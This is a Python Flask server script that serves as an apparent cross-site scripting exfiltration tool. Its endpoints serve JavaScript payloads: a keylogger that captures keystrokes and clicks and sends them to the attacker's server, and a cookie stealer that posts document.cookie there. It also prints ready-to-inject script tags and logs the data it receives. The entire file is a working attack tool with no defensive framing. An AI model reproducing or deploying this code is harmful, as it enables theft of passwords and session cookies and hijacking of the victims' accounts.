#!/bin/python3
import argparse
from flask import Flask, render_template, request, jsonify, redirect, make_response
from flask_cors import CORS
import netifaces

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


app = Flask(__name__, template_folder="./templates")
CORS(app)
ip = ""
port = "" 


# Keylogger
@app.route("/keylogger", methods=["GET", "POST"])
def keylogger():
    if request.method == "POST":
        r = request.data.decode("utf-8")
        print(f"{bcolors.FAIL}{r}{bcolors.ENDC}")
        return ""

    elif request.method == "GET":
        return "var server=\"http://" + str(ip) + ":" + str(port) + "/keylogger\";key = \"\";document.onkeypress = function(e){if(e.keyCode === 13){event.preventDefault();var x = new XMLHttpRequest();x.open(\"POST\", server, true);x.send(key + \" <Press enter>\");key = \"\"}else if(e.keyCode === 9){event.preventDefault();var x = new XMLHttpRequest();x.open(\"POST\", server, true);x.send(key + \" <Press tab>\");key = \"\"}else{key += e.key;}};document.onclick = function(e){click = \"\";if(e.keyCode == 1){click = \" <Left Click>\";}else{click = \" <Right Click>\";}var x = new XMLHttpRequest();x.open(\"POST\", server, true);x.send(key + click);key = \"\"};"


# Cookies
@app.route("/cookies", methods=["GET", "POST"])
def cookies():
    if request.method == "POST":
        r = request.data.decode("utf-8")
        print(f"Cookies: {bcolors.FAIL}{r}{bcolors.ENDC}")
        return ""

    elif request.method == "GET":
    	return "var server=\"http://" + str(ip) + ":" + str(port) + "/cookies\"; var x = new XMLHttpRequest(); x.open(\"POST\", server, true); x.send(document.cookie);"


@app.route("/fingerprint", methods=["GET", "POST"])
def prueba():
    if request.method == "POST":
        r = request.data.decode("utf-8")
        print(f"{bcolors.FAIL}{r}{bcolors.ENDC}")
        return ""

    elif request.method == "GET":
        return ""


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="This script is a flask HTTP server")
    parser.add_argument("-p", "--port", required=False)
    parser.add_argument("-i", "--interface", required=True)
    args = parser.parse_args()

    ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0]['addr']
    if args.port is None:
        port = 8085
    else:
        port = args.port

    print("<script type=\"text/javascript\" src=\"http://" + str(ip) + ":" + str(port) + "/keylogger\"></script>")
    print("<script type=\"text/javascript\" src=\"http://" + str(ip) + ":" + str(port) + "/cookies\"></script>")
    print("")
    app.run(port=port, host=ip, debug=False)
